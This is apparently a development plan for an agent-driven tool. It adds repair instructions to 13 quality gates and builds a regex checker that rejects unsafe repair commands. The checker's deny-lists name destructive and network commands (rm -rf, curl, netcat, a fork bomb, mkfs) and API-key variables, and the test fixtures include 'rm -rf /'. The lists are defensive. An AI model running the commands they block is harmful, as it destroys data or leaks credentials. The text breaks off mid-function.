---
plan_id: 33-01
phase: 33
title: Repair Instruction Contract
schema_version: 2
model: sonnet
expected_ATC_tier: FULL
requirements: [REPAIR-01, REPAIR-02, REPAIR-03, REPAIR-04]
locked_decisions: [33=C, 26.3]
depends_on: [32]
created: 2026-04-27
files_modified:
  - super-gsd/registry/gates.yaml
  - super-gsd/scripts/lib/repair-command-checker.cjs
  - super-gsd/scripts/lib/gates-registry.cjs
  - super-gsd/scripts/lib/sgsd-mission-strip.ps1
  - super-gsd/skills/sgsd-complete-milestone/SKILL.md
autonomous: true
tasks:
  - id: T1
    type: config
    files_touched: [super-gsd/registry/gates.yaml]
    hypothesis: "Every gate carrying a human-readable repair_instruction enables the cockpit + milestone-close to surface actionable next steps without bespoke regex parsing."
    falsifier: "If a gate fires hard-halt and Mission Strip Q4 still shows a generic 'gate fired' message instead of repair text, the contract is decorative."
    stop_rule: "grep -c '^    repair_instruction:' gates.yaml >= 13"
    minimal_test: "grep + visual review confirms each repair_instruction is <=200 chars and actionable."

  - id: T2
    type: config
    files_touched: [super-gsd/registry/gates.yaml]
    hypothesis: "Of the 4 candidates flagged in RESEARCH 3, only 2 actually pass 4-AND when the underlying script is verified to support a non-mutating flag; adding repair_command on those 2 enables autonomous self-repair without auth/network/destructive risk."
    falsifier: "If validateOneCommand rejects either of the 2 chosen commands, the predicate analysis is wrong; ship instruction-only."
    stop_rule: "Both candidate commands return {ok: true, failed_predicates: []}."
    minimal_test: "validateRepairCommands(gates.yaml) -> {ok: true, violations: []}"

  - id: T3
    type: code
    files_touched: [super-gsd/scripts/lib/repair-command-checker.cjs]
    hypothesis: "A regex-based 4-AND predicate checker rejects all violating commands at gates.yaml load time before any dispatch can fire them."
    falsifier: "If a fixture command containing curl/rm-rf/--force/auth-token slips past the checker, the predicate is incomplete."
    stop_rule: "self-test 14 assertions PASS; injecting a violating command into a test fixture returns {ok: false, violations: [{gate, command, failed_predicates}]}."
    minimal_test: "node super-gsd/scripts/lib/repair-command-checker.cjs --self-test -> exit 0"

  - id: T4
    type: code
    files_touched: [super-gsd/scripts/lib/gates-registry.cjs]
    hypothesis: "Wiring validateRepairCommands at gates.yaml load time turns the 4-AND predicate into a defense-in-depth boundary: a poisoned config halts orchestrator startup, never silently runs."
    falsifier: "If the integration only checks at --self-test invocation but not at every load(), the wire is decorative."
    stop_rule: "Throw on validation failure with structured message naming gate + failed_predicate; existing tests still pass."
    minimal_test: "node super-gsd/scripts/lib/gates-registry.cjs invoked via test fixture with poisoned yaml throws; canonical gates.yaml load succeeds."

  - id: T5
    type: code
    files_touched: [super-gsd/scripts/lib/sgsd-mission-strip.ps1]
    hypothesis: "Surfacing repair_instruction text on the Q4 lane gives the operator (or autonomous orchestrator) immediate next-step visibility without a separate query."
    falsifier: "If the cockpit still shows generic gate-fired prose, the surface is broken."
    stop_rule: "Cockpit Q4 line includes '| repair: <text>' when a gate is fired and unresolved."
    minimal_test: "Render Mission Strip with a fired-gate fixture; assert repair text in output."

  - id: T6
    type: docs
    files_touched: [super-gsd/skills/sgsd-complete-milestone/SKILL.md]
    hypothesis: "Listing unresolved repairs at milestone close converts open contracts into explicit accountable backlog rather than silent debt."
    falsifier: "If milestones close with fired gates that had repair_instruction but the SUMMARY omits them, repairs leak into v1.8+ unflagged."
    stop_rule: "SUMMARY template includes Unresolved Repairs section per RESEARCH section 6."
    minimal_test: "Render a milestone-close SUMMARY against fixture; assert Unresolved Repairs block present (or 'none')."

  - id: T7
    type: test
    files_touched: [super-gsd/scripts/lib/repair-command-checker.cjs]
    hypothesis: "The verifier runs all REPAIR-01..04 checks deterministically against the actual gates.yaml + checker pair."
    falsifier: "If REPAIR-03 only checks a fixture, never the real gates.yaml, the contract isn't validated against shipped state."
    stop_rule: "All 4 acceptance checks (REPAIR-01..04) PASS against the real gates.yaml + new checker."
    minimal_test: "Embedded verifier section runs without errors and emits PASS for all 4."

must_haves:
  truths:
    - "All 13 gates carry repair_instruction: text (REPAIR-01 strict reading)"
    - "Only 2 gates carry repair_command: (the ones whose underlying script supports a non-mutating flag AND passes 26.3 4-AND); 2 RESEARCH candidates demoted after A2 verification"
    - "Schema-load checker integrates at gates-registry.cjs load() time, not just --self-test (defense-in-depth)"
    - "Checker public API never throws upward (mirrors route-ledger.cjs locked design)"
    - "PREDICATES frozen const = ['deterministic', 'safe', 'local', 'auth-free']"
  artifacts:
    - super-gsd/registry/gates.yaml (13 repair_instruction + 2 repair_command edits)
    - super-gsd/scripts/lib/repair-command-checker.cjs (NEW ~280 LOC)
    - super-gsd/scripts/lib/gates-registry.cjs (load-time integration ~10 LOC at line 53)
    - super-gsd/scripts/lib/sgsd-mission-strip.ps1 (Q4 surfacing ~10 LOC at line 270)
    - super-gsd/skills/sgsd-complete-milestone/SKILL.md (SUMMARY extension ~12 LOC at lines 103-114)
  key_links:
    - 33-CONTEXT.md
    - 33-RESEARCH.md (sections 4, 5, 6, 8 for predicate impl, checker design, surfacing, locks)
    - command-envelope-v1.yaml:204-212 (existing repair_instruction_only, repair_command_eligible, repair_command_rejected_by_4and reason_codes)
---

<objective>
Phase 33 ships the repair contract: every gate in `super-gsd/registry/gates.yaml`
gets a mandatory `repair_instruction:` text (13 of 13), and a small subset gets
an OPTIONAL `repair_command:` -- but ONLY where the DISCUSS 26.3 4-AND safety
predicate holds (deterministic AND safe AND local AND auth-free). A new lib
at `super-gsd/scripts/lib/repair-command-checker.cjs` enforces the predicate
at gates.yaml load time so a poisoned registry halts orchestrator startup
before any dispatch fires. Mission Strip Q4 surfaces the text; milestone-close
SUMMARY enumerates unresolved repairs.

Purpose: convert the implicit "operator reads gate logs and figures it out"
contract into an explicit, machine-readable, schema-validated repair contract.
Text for humans. Optional commands for autonomous repair under safety locks.

Output:
- 13 `repair_instruction:` rows added to gates.yaml
- 2 `repair_command:` rows added to gates.yaml (after A2 verification demoted 2)
- 1 new lib (`repair-command-checker.cjs`) with --self-test (14 assertions)
- 1 load-time wire-in to `gates-registry.cjs`
- Mission Strip Q4 surfacing extension
- Milestone-close SUMMARY "Unresolved Repairs" section

Controlling principle: autonomy continues; evidence tells the truth.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/milestones/v1.7/phases/33-repair-instruction/33-CONTEXT.md
@.planning/milestones/v1.7/phases/33-repair-instruction/33-RESEARCH.md
@.planning/milestones/v1.7/REQUIREMENTS.md

@super-gsd/registry/gates.yaml
@super-gsd/scripts/lib/gates-registry.cjs
@super-gsd/scripts/lib/route-ledger.cjs
@super-gsd/scripts/lib/crit-backlog.cjs
@super-gsd/scripts/lib/sgsd-mission-strip.ps1
@super-gsd/skills/sgsd-complete-milestone/SKILL.md

<a2_verification_results>
RESEARCH section A2 flagged a medium-risk assumption: the 4 candidate
`repair_command:` scripts must actually support a non-mutating flag
(--self-test or --dry-run) before we can claim 4-AND holds. The kill/defer
condition in 33-CONTEXT.md mandates demotion to instruction-only when a
flag is absent.

The planner ran the verification before authoring T2. Findings:

| # | Gate | Candidate command | --self-test? | --dry-run? | Decision |
|---|------|-------------------|--------------|------------|----------|
| 5 | sgsd-recall-queries | bash super-gsd/scripts/sgsd-recall.sh --self-test | NO | NO | DEMOTE -> instruction-only |
| 7 | MUDA-waste-audit | bash super-gsd/scripts/sgsd-muda-audit.sh --dry-run | NO | YES (line 43) | KEEP |
| 9 | sgsd-curate-learnings | bash super-gsd/scripts/sgsd-curate.sh --dry-run | NO | YES (line 53) | KEEP |
| 10 | token-log | node super-gsd/tools/token-audit/check.cjs --self-test | n/a (file missing) | n/a | DEMOTE -> instruction-only |

Verification commands run:
- `Grep('--self-test|--dry-run', super-gsd/scripts/sgsd-recall.sh)` -> 0 matches
- `Grep('--self-test|--dry-run', super-gsd/scripts/sgsd-muda-audit.sh)` -> matches at lines 18, 23, 43, 54, 340 (--dry-run flag handled in arg parsing at line 43)
- `Grep('--self-test|--dry-run', super-gsd/scripts/sgsd-curate.sh)` -> matches at lines 23, 53 (--dry-run flag handled in arg parsing at line 53)
- `Glob('super-gsd/tools/token-audit/**')` -> No files found

Result: only 2 of 4 RESEARCH-3 candidates ship `repair_command:`. The other
2 demote to `repair_instruction:` only. T2 reflects this. T7 verifier
asserts exactly 2 gates carry `repair_command:`.

The 2 demotions are NOT lost work: a v1.8+ task can add `--self-test` to
sgsd-recall.sh (or create the missing token-audit/check.cjs) and lift the
gates back into the auto-repair contract by appending one yaml line each.
The schema accepts the field; the predicate would then pass.
</a2_verification_results>

<interfaces>
<!-- Key types and contracts the executor needs. Extracted from codebase. -->
<!-- Executor uses these directly. No codebase exploration needed. -->

From super-gsd/scripts/lib/gates-registry.cjs (existing, line 38-55):
```javascript
function loadGates(gatesYamlPath) {
  if (_cache) return _cache;
  // ... load yaml via pinned js-yaml at super-gsd/tools/plan-schema/node_modules/js-yaml
  const all = (parsed && Array.isArray(parsed.gates)) ? parsed.gates : [];
  const byName = {};
  for (const g of all) byName[g.name] = g;
  _cache = { all, byName };  // <-- INSERT validateRepairCommands HERE (line 53)
  return _cache;
}

module.exports = { loadGates, getGate, shouldFire, resetCache };
```

From super-gsd/scripts/lib/route-ledger.cjs (template; mirror its shape 1:1):
```javascript
const FROZEN_CONST = Object.freeze([...]);   // Pattern for PREDICATES
function selfTest() { /* tmp-dir + 14 assertions */ return 0; }
function publicWrappedApi(args) {
  try { return _internalThatThrows(args); }
  catch (e) { console.warn('[SGSD] ... failed:', e.message); return false; }
}
if (require.main === module) {
  const cmd = process.argv[2];
  if (cmd === '--self-test') process.exit(selfTest());
  // ...
}
module.exports = { ... };
```

From super-gsd/registry/command-envelope-v1.yaml:204-212 (existing):
- `repair_instruction_only`     (group: repair) -- ship for instruction-only gates
- `repair_command_eligible`     (group: repair) -- ship when 4-AND passes
- `repair_command_rejected_by_4and` (group: repair) -- ship on validation fail

Reuse this vocabulary. Do NOT introduce new repair reason_codes.

From super-gsd/scripts/lib/sgsd-mission-strip.ps1:259 (existing -- the
node expression to extend in T5):
```powershell
$nodeExpr = "const m=require('$($cjsPath -replace '\\','/')'); const rows=m.rowsForPhase('$(($ProjectDir -replace '\\','/'))/.planning', '$($out.activePhase)'); console.log(JSON.stringify({n:rows.length, first: (rows[0] && rows[0].summary) || ''}));"
```

From super-gsd/scripts/lib/sgsd-mission-strip.ps1:270 (existing -- the
blocker line to extend):
```powershell
$out.blocker = "> blocker blocked  $n open : $firstShort"
```

From super-gsd/skills/sgsd-complete-milestone/SKILL.md:103-114 (Step 6):
The SUMMARY template lists six bullets (frontmatter, shipped phases,
evidence, rules, governance, next-milestone seed). T6 inserts a 7th
bullet pointing at the Unresolved Repairs section, plus the section
template itself.
</interfaces>
</context>

<known_dead_ends>
The following are explicitly out-of-scope for Phase 33. Do NOT do them:

1. **DO NOT** add `repair_command:` to any gate that fails the 4-AND predicate.
   Even if RESEARCH section 3 listed a candidate, the A2 verification above
   may have demoted it. Trust the table in `<a2_verification_results>`, not
   the original RESEARCH-3 list.

2. **DO NOT** modify `super-gsd/registry/command-envelope-v1.yaml` or
   `super-gsd/registry/command-envelope-v1.json`. Phase 31 froze them. The
   3 repair reason_codes already exist at lines 204-212. We REUSE them.

3. **DO NOT** modify the existing 4 contracts:
   - `code-reviewer-v1`
   - `review-providers-v1`
   - `handover-contract-v2`
   - `plan-schema-v2`
   Phase 33 ships a NEW config + lib; it does not touch them.

4. **DO NOT** introduce `ajv` or any new yaml-schema dependency. Use regex
   deny-lists per RESEARCH section 4. The js-yaml library is already pinned
   at `super-gsd/tools/plan-schema/node_modules/js-yaml` -- reuse it via the
   same pattern as `gates-registry.cjs:42-44`.

5. **DO NOT** auto-execute `repair_command:` from the orchestrator in this
   phase. Auto-execution is a v1.8+ decision. Phase 33 ships SCHEMA + CHECKER
   + STATIC TEXT only. The schema-load checker IS the in-phase consumer.

6. **DO NOT** add `repair_instruction` to `crit-backlog.jsonl` schema.
   Single source of truth = `gates.yaml`. Mission Strip reads it directly.

7. **DO NOT** create a separate `repair-command-checker.test.cjs` file.
   Self-test lives inline behind `--self-test` (mirrors route-ledger.cjs).

8. **DO NOT** add a 7th line to Mission Strip. DISCUSS 28.2 locked SIX lines.
   We extend Q4 (line 4) by appending `| repair: <text>` to the existing line.

9. **DO NOT** use `git add -A` or `git add .`. Stage by name. 7 atomic commits.

10. **DO NOT** delete the `(?!auth\s+status)` exemption on the `gh` regex
    even if it feels overly clever. Per RESEARCH A3 it is a documented
    minor positive assumption; preserve it for symmetry with the existing
    deny-list shape.
</known_dead_ends>

<tasks>

<!-- ===================================================================== -->
<!-- T1: Add repair_instruction to all 13 gates (REPAIR-01)                -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T1: Add repair_instruction text to all 13 gates in gates.yaml</name>
  <files>super-gsd/registry/gates.yaml</files>
  <behavior>
    - After this task, `grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml` returns >= 13
    - Each repair_instruction value is YAML-safe (double-quoted), <=200 chars, actionable
    - No existing keys removed; only additions
  </behavior>
  <action>
For each of the 13 gate rows in `super-gsd/registry/gates.yaml`, insert a
new `repair_instruction:` line immediately AFTER the `name:` line, BEFORE
the existing `category:` line. Use 4-space indentation (matches the
existing field indent at line 38 onwards).

Per D-01 (33=C strict reading) and per RESEARCH section 2 LOCKED text.
Each instruction is YAML-quoted with double-quotes to permit colons and
backticks inside the string.

Byte-exact insertions (insert immediately after `name:` line for each gate):

Gate 1 (after `  - name: per-dispatch-ATC` at line 37):
```yaml
    repair_instruction: "Read the latest commit-reviews.jsonl row in `.planning/phases/{N}/`, address the CRIT verdict, re-commit, and re-dispatch the executor to refire ATC."
```

Gate 2 (after `  - name: phase-level-ATC` at line 61):
```yaml
    repair_instruction: "Read `.planning/milestones/{ms}/phases/{NN}-*/{NN}-ATC-REVIEW.md`. Address each WARN/CRIT in a follow-up commit; re-run gsd-verifier to refire phase-level-ATC."
```

Gate 3 (after `  - name: classifier-haiku` at line 77):
```yaml
    repair_instruction: "Re-run the classifier dispatch with Agent(model='haiku', task='classify'); if Haiku is offline, fall back to a single-shot Sonnet classify and log DEVIATIONS."
```

Gate 4 (after `  - name: context-selector-haiku` at line 89):
```yaml
    repair_instruction: "Re-run the context-selector dispatch with Agent(model='haiku', task='select_context'); if empty, retry with broader recall query."
```

Gate 5 (after `  - name: sgsd-recall-queries` at line 101):
```yaml
    repair_instruction: "Run `bash super-gsd/scripts/sgsd-recall.sh '<query>'` for each recall term in the plan; if memory tree empty, mark dispatch as cold-start and continue."
```

Gate 6 (after `  - name: intent-injection` at line 116):
```yaml
    repair_instruction: "Re-compose the dispatch prompt and re-inject the intent block from the plan frontmatter; verify the agent received it via the dispatch report's INTENT echo."
```

Gate 7 (after `  - name: MUDA-waste-audit` at line 127):
```yaml
    repair_instruction: "Run `bash super-gsd/scripts/sgsd-muda-audit.sh --phase {N}` and address findings in `.planning/phases/{N}/WASTE.md`; rerun until WARN-or-PASS."
```

Gate 8 (after `  - name: qualitative-waste-audit` at line 150):
```yaml
    repair_instruction: "Re-dispatch sgsd-code-reviewer with --qualitative-waste against the latest WASTE.md; address findings in a follow-up commit."
```

Gate 9 (after `  - name: sgsd-curate-learnings` at line 172):
```yaml
    repair_instruction: "Run `bash super-gsd/scripts/sgsd-curate.sh` to write learnings under `.planning/memory/`; verify with `grep -r '<pattern>' .planning/memory/`."
```

Gate 10 (after `  - name: token-log` at line 194):
```yaml
    repair_instruction: "Append the missing token row to `.planning/metrics/token-log.jsonl` from the dispatch report; re-run the milestone token reconciliation script."
```

Gate 11 (after `  - name: vtp-enrichment` at line 207):
```yaml
    repair_instruction: "Run `node super-gsd/scripts/lib/vtp-enrichment-gate.cjs --phase {N}`; if VTP api_error, fall back per fallback-chain (sgsd-memory) and log provider_unavailable."
```

Gate 12 (after `  - name: verifier-row-arithmetic` at line 227):
```yaml
    repair_instruction: "Open `.planning/phases/{N}/{N}-verify.mjs`, fix the row-count mismatch (expected vs actual), and re-run `node {N}-verify.mjs`."
```

Gate 13 (after `  - name: verifier-detail-vs-summary` at line 241):
```yaml
    repair_instruction: "Reconcile detail rows with the summary block in `{N}-VERIFICATION.md`; either expand the summary or delete the orphan detail rows; re-run verifier."
```

Constraints:
- ASCII only. No smart quotes. No em dashes (use `--` if needed).
- LF line endings (match existing file).
- Each repair_instruction line <=200 chars total (count includes leading 4 spaces and `repair_instruction: ` prefix).
- Re-load gates.yaml via existing js-yaml after editing to ensure no syntax breakage.
  </action>
  <verify>
    <automated>node -e "const fs=require('fs'); const t=fs.readFileSync('super-gsd/registry/gates.yaml','utf8'); const c=(t.match(/^    repair_instruction:/gm)||[]).length; if(c<13){console.error('FAIL: expected >=13 repair_instruction rows, got',c); process.exit(1);} console.log('PASS: '+c+' repair_instruction rows');"</automated>
  </verify>
  <done>
    - `grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml` returns 13
    - `node super-gsd/scripts/lib/gates-registry.cjs` (require + load) does not throw
    - js-yaml parse of the file succeeds (no syntax error)
  </done>
</task>

<!-- ===================================================================== -->
<!-- T2: Add repair_command (2 of 13 after A2 verification) -- REPAIR-02   -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T2: Add repair_command lines to the 2 gates whose underlying script supports a non-mutating flag</name>
  <files>super-gsd/registry/gates.yaml</files>
  <behavior>
    - After this task, exactly 2 gates carry `repair_command:` (MUDA-waste-audit + sgsd-curate-learnings)
    - Both commands pass the 4-AND predicate when validateOneCommand runs (T3 lib must already exist OR the assertion runs in T7 verifier; until then, the field is just text)
    - The other 11 gates ship `repair_instruction:` only
    - The previously RESEARCH-3-listed sgsd-recall-queries and token-log are NOT extended (per A2 demotion; see <a2_verification_results>)
  </behavior>
  <action>
A2 VERIFICATION OUTCOME (run before authoring this task; documented in
<a2_verification_results> above):

| Gate | Candidate command | A2 result | Decision |
|------|-------------------|-----------|----------|
| sgsd-recall-queries | sgsd-recall.sh --self-test | flag absent | DEMOTE |
| MUDA-waste-audit | sgsd-muda-audit.sh --dry-run | --dry-run present (line 43) | KEEP |
| sgsd-curate-learnings | sgsd-curate.sh --dry-run | --dry-run present (line 53) | KEEP |
| token-log | tools/token-audit/check.cjs --self-test | file missing | DEMOTE |

Insert `repair_command:` for the 2 KEEP gates only. Place each immediately
AFTER the `repair_instruction:` line added in T1, BEFORE `category:`.

Byte-exact insertions:

Gate 7 MUDA-waste-audit (after the new repair_instruction line):
```yaml
    repair_command: "bash super-gsd/scripts/sgsd-muda-audit.sh --dry-run"
```

Gate 9 sgsd-curate-learnings (after the new repair_instruction line):
```yaml
    repair_command: "bash super-gsd/scripts/sgsd-curate.sh --dry-run"
```

DO NOT add repair_command to:
- sgsd-recall-queries (per A2: --self-test/--dry-run flag absent on sgsd-recall.sh)
- token-log (per A2: super-gsd/tools/token-audit/check.cjs does not exist)
- per-dispatch-ATC, phase-level-ATC, qualitative-waste-audit (auth-bound; needs Codex/Claude provider)
- classifier-haiku, context-selector-haiku (auth-bound; needs Anthropic auth)
- intent-injection (semantic op; no command can repair it)
- vtp-enrichment (network + auth-bound)
- verifier-row-arithmetic, verifier-detail-vs-summary (semantic reconciliation)

Constraints:
- ASCII only.
- 4-space indentation.
- Double-quoted strings.
- Each command verifiable as 4-AND-compliant: deterministic (no time/random/network), safe (--dry-run flag = read-only), local (relative path), auth-free (no env-var refs).
  </action>
  <verify>
    <automated>node -e "const fs=require('fs'); const t=fs.readFileSync('super-gsd/registry/gates.yaml','utf8'); const c=(t.match(/^    repair_command:/gm)||[]).length; if(c!==2){console.error('FAIL: expected exactly 2 repair_command rows, got',c); process.exit(1);} const muda=t.includes('bash super-gsd/scripts/sgsd-muda-audit.sh --dry-run'); const curate=t.includes('bash super-gsd/scripts/sgsd-curate.sh --dry-run'); if(!muda||!curate){console.error('FAIL: missing expected command(s)'); process.exit(1);} console.log('PASS: 2 repair_command rows, both expected');"</automated>
  </verify>
  <done>
    - `grep -c '^    repair_command:' super-gsd/registry/gates.yaml` returns 2
    - The 2 commands are `bash super-gsd/scripts/sgsd-muda-audit.sh --dry-run` and `bash super-gsd/scripts/sgsd-curate.sh --dry-run`
    - js-yaml parse succeeds
    - Demotion documented in plan body (a2_verification_results section above)
  </done>
</task>

<!-- ===================================================================== -->
<!-- T3: NEW super-gsd/scripts/lib/repair-command-checker.cjs (~280 LOC)   -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T3: Create repair-command-checker.cjs lib + 14-assertion self-test</name>
  <files>super-gsd/scripts/lib/repair-command-checker.cjs</files>
  <behavior>
    - PREDICATES is a frozen array equal to ['deterministic','safe','local','auth-free']
    - DENYLISTS has 4 keys (deterministic, safe, local, auth_free), each non-empty array of RegExp
    - validateOneCommand('node super-gsd/tools/system-map/generate.cjs') -> {ok:true, failed_predicates:[], matches:[]}
    - validateOneCommand('rm -rf /') -> {ok:false, failed_predicates: ['safe', ...], matches:[...]}
    - validateOneCommand('curl https://x.y') -> {ok:false, failed_predicates: contains 'local'}
    - validateOneCommand('gh auth login') -> {ok:false, failed_predicates: contains 'auth-free'}
    - validateRepairCommands({gates:[{name:'g1', repair_command:'rm -rf /'}]}) -> {ok:false, violations:[...]}
    - validateRepairCommands({gates:[{name:'g1'}]}) -> {ok:true} (no command = no check)
    - assertEveryBlockingGateHasInstruction({gates:[{name:'g1', enforcement_mode:'hard-halt'}]}) -> {ok:false, missing:['g1']}
    - --self-test exits 0 with all 14 assertions passing
    - Self-test fingerprint guard: canonical gates.yaml mtime/size unchanged after self-test
    - Public API never throws upward (mirrors route-ledger.cjs pattern)
  </behavior>
  <action>
Create the new file `super-gsd/scripts/lib/repair-command-checker.cjs`
with the following byte-exact content:

```javascript
'use strict';

// ============================================================================
// SGSD - REPAIR-COMMAND-CHECKER
// ============================================================================
// Phase 33 (REPAIR-01..04). Validates `repair_command:` strings in
// gates.yaml against the DISCUSS 26.3 4-AND safety predicate:
//
//   deterministic AND safe AND local AND auth-free
//
// Implementation: 4 frozen regex deny-lists. Any match in any list = the
// command violates that predicate. ANY violation = command rejected.
//
// Public API never throws upward (mirrors super-gsd/scripts/lib/route-ledger.cjs
// LOCKED design from 32-RESEARCH section 9.3). Internal helpers throw on
// closed-enum violations; the public-API try/catch wraps every call and
// returns a structured {ok, violations} result instead.
//
// Integration: super-gsd/scripts/lib/gates-registry.cjs:53 calls
// validateRepairCommands(parsed) at LOAD time. On {ok:false}, gates-registry
// throws -- a poisoned registry halts orchestrator startup.
//
// Reason codes (from super-gsd/registry/command-envelope-v1.yaml:204-212):
//   repair_instruction_only       -- gate ships text only
//   repair_command_eligible       -- gate ships command and 4-AND passes
//   repair_command_rejected_by_4and -- gate ships command and 4-AND fails
// ============================================================================

const fs   = require('fs');
const path = require('path');

// ----------------------------------------------------------------------------
// Frozen closed enum: the 4 AND clauses. Ordering matters for stable output.
// ----------------------------------------------------------------------------
const PREDICATES = Object.freeze(['deterministic', 'safe', 'local', 'auth-free']);

// ----------------------------------------------------------------------------
// 4-AND DENY-LISTS (per RESEARCH section 4, all 4 sub-sections verbatim).
// Any regex match in ANY list flags that predicate as failed.
// ----------------------------------------------------------------------------
const DETERMINISTIC_DENYLIST = [
  /\$\(date[^)]*\)/i,             // $(date), $(date +%s)
  /\$RANDOM\b/,                    // $RANDOM
  /Date\.now\(\)/,                 // Date.now()
  /Math\.random\(\)/,              // Math.random()
  /\bcurl\b/i,                     // curl (network = non-deterministic)
  /\bwget\b/i,                     // wget
  /\bgh\b\s+(?!auth\s+status)/,    // gh hits remote (gh auth status exempt; A3)
  /\bopenssl\s+rand\b/,            // openssl rand
  /\/dev\/u?random\b/,             // /dev/random, /dev/urandom
  /--seed=\$\(/,                   // dynamic seed
  /\bdate\s+\+/,                   // date +<format>
];

const SAFE_DENYLIST = [
  /\brm\s+-r?f\b/,                 // rm -rf, rm -f
  /\brm\s+-f?r\b/,                 // rm -fr
  /\bDROP\s+TABLE\b/i,             // SQL DROP
  /\bDELETE\s+FROM\b/i,            // SQL DELETE
  /\bTRUNCATE\b/i,
  /\bgit\s+push\b/i,               // including --force (DISCUSS verbatim)
  /\bgit\s+reset\s+--hard\b/i,
  /\bgit\s+clean\s+-f/i,
  /\b--force\b/i,                  // generic --force flag (DISCUSS verbatim)
  /\b-f\s+\//,                     // -f against absolute root path
  /\s>\s*\//,                      // redirect to absolute path
  /\s>>\s*\//,                     // append-redirect to absolute path
  /\bsudo\b/,                      // sudo escalates outside tree
  /\bchmod\s+(?:777|\+x\s+\/)/,    // chmod 777, chmod +x against /
  /\bdd\s+if=/,                    // dd commands
  /\bmkfs\b/,                      // mkfs
  /\b:\(\)\s*\{\s*:\|/,            // fork bomb
  /\bnpm\s+install\b/,             // npm install mutates node_modules outside tree-control
];

const LOCAL_DENYLIST = [
  /\bcurl\b/i,
  /\bwget\b/i,
  /\bssh\b/i,
  /\bscp\b/i,
  /\brsync\s+[^\s]+:/,             // rsync host:path = remote
  /\bkubectl\b/i,
  /\bdocker\s+(push|pull|run\s+--network)/i,
  /\bgh\b\s+(?!auth\s+status)/,    // gh almost always remote
  /\baws\b\s+(?!sts\s+get-caller-identity)/i,
  /\bhttps?:\/\//i,                // any URL literal
  /:\/\/[^\s\/]+/,                 // generic protocol://host
  /\bnetcat\b|\bnc\s+-/,           // netcat probes
  /\bping\b/i,                     // ICMP
  /\bnpm\s+(install|publish|adduser)/,
  /\bpip\s+(install|upload)/,
];

const AUTH_FREE_DENYLIST = [
  /\$OPENAI_API_KEY/,
  /\$CODEX_API_KEY/,
  /\$ANTHROPIC_API_KEY/,
  /\$GH_TOKEN\b/,
  /\$GITHUB_TOKEN/,
  /\$AWS_(ACCESS_KEY|SECRET)/,
  /\bgh\s+auth\b/,                 // gh auth login/logout/refresh
  /\baws\s+sts\b/,
  /\bkubectl\s+(--token|--kubeconfig=\/)/,
  /\bvault\s+(login|read)\b/i,
  /\boauth\b/i,
  /\bbasic\s+auth\b/i,
  /\b--header\s+["']?Authorization/i,
  /\b-H\s+["']?Authorization/i,
];

const DENYLISTS = Object.freeze({
  deterministic: DETERMINISTIC_DENYLIST,
  safe: SAFE_DENYLIST,
  local: LOCAL_DENYLIST,
  auth_free: AUTH_FREE_DENYLIST,
});

// Map auth_free key <-> 'auth-free' predicate name.
const PREDICATE_KEY = Object.freeze({
  deterministic: 'deterministic',
  safe: 'safe',
  local: 'local',
  auth_free: 'auth-free',
});

// ----------------------------------------------------------------------------
// validateOneCommand(cmdString) -> {ok, failed_predicates, matches}
// ----------------------------------------------------------------------------
function validateOneCommand(cmd) {
  if (typeof cmd !== 'string') {
    throw new Error('repair-command-checker: command must be a string');
  }
  const failed = [];
  const matches = [];
  for (const key of Object.keys(DENYLISTS)) {
    const list = DENYLISTS[key];
    for (const rx of list) {
      const m = cmd.match(rx);
      if (m) {
        const pred = PREDICATE_KEY[key];
        if (!failed.includes(pred)) failed.push(pred);
        matches.push({ predicate: pred, pattern: rx.source, match: m[0] });
      }
    }
  }
  return { ok: failed.length === 0, failed_predicates: failed, matches };
}

// ----------------------------------------------------------------------------
// validateRepairCommands(parsedYaml) -> {ok, total_commands_checked, total_violations, violations}
// ----------------------------------------------------------------------------
function validateRepairCommands(parsedYaml) {
  if (!parsedYaml || !Array.isArray(parsedYaml.gates)) {
    return { ok: true, total_commands_checked: 0, total_violations: 0, violations: [] };
  }
  const violations = [];
  let checked = 0;
  for (const g of parsedYaml.gates) {
    if (!g || typeof g.repair_command !== 'string' || !g.repair_command.trim()) continue;
    checked++;
    const r = validateOneCommand(g.repair_command);
    if (!r.ok) {
      violations.push({
        gate: g.name || '<unnamed>',
        command: g.repair_command,
        failed_predicates: r.failed_predicates,
        matches: r.matches,
        message:
          `gate '${g.name || '<unnamed>'}' repair_command failed 4-AND predicate(s): ` +
          `${r.failed_predicates.join(', ')} (matched: ` +
          `${r.matches.map((m) => `'${m.match}'`).join(', ')})`,
      });
    }
  }
  return {
    ok: violations.length === 0,
    total_commands_checked: checked,
    total_violations: violations.length,
    violations,
  };
}

// ----------------------------------------------------------------------------
// validateGatesYaml(yamlPath) -> read+parse+validate. Convenience.
// ----------------------------------------------------------------------------
function validateGatesYaml(yamlPath) {
  const yamlLibPath = path.resolve(
    __dirname, '..', '..', 'tools', 'plan-schema', 'node_modules', 'js-yaml'
  );
  const yaml = require(yamlLibPath);
  const raw = fs.readFileSync(yamlPath, 'utf8');
  const parsed = yaml.load(raw);
  return validateRepairCommands(parsed);
}

// ----------------------------------------------------------------------------
// assertEveryBlockingGateHasInstruction(parsed) -> {ok, missing}
// "blocking" = enforcement_mode is hard-halt OR amortized OR
// (soft-warn with escalation: block_on_api_error). REPAIR-01 strict reading.
// ----------------------------------------------------------------------------
function assertEveryBlockingGateHasInstruction(parsedYaml) {
  if (!parsedYaml || !Array.isArray(parsedYaml.gates)) {
    return { ok: true, missing: [] };
  }
  const missing = [];
  for (const g of parsedYaml.gates) {
    if (!g) continue;
    const blocking =
      g.enforcement_mode === 'hard-halt' ||
      g.enforcement_mode === 'amortized' ||
      (g.enforcement_mode === 'soft-warn' && g.escalation === 'block_on_api_error');
    if (!blocking) continue;
    if (typeof g.repair_instruction !== 'string' || !g.repair_instruction.trim()) {
      missing.push(g.name || '<unnamed>');
    }
  }
  return { ok: missing.length === 0, missing };
}

// ----------------------------------------------------------------------------
// repairInstructionForBacklogRow(row, gatesYamlPath) -> string
// Mission Strip Q4 helper. Returns the gate's repair_instruction or ''.
// Public API never throws upward; on lookup failure returns ''.
// ----------------------------------------------------------------------------
function repairInstructionForBacklogRow(row, gatesYamlPath) {
  try {
    if (!row || typeof row !== 'object') return '';
    let gateName = null;
